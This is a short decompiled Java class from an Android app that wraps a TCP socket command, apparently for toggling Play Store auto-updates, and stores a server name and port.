package com.vvt.playstore.autoupdateapps.core.ref.command;

import com.fx.socket.TcpSocketCmd;

public class RemotePlayStoreAutoUpdateApps
  extends TcpSocketCmd
{
  private static String a;
  private static int b = 0;
  private static final long serialVersionUID = -8123807756702609223L;
  
  public RemotePlayStoreAutoUpdateApps(String paramString, int paramInt)
  {
    super("", Boolean.class);
    a = paramString;
    b = paramInt;
  }
  
  protected int getPort()
  {
    return b;
  }
  
  protected String getServerName()
  {
    return a;
  }
  
  protected String getTag()
  {
    return "RemotePlayStoreAutoUpdateApps";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/playstore/autoupdateapps/core/ref/command/RemotePlayStoreAutoUpdateApps.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */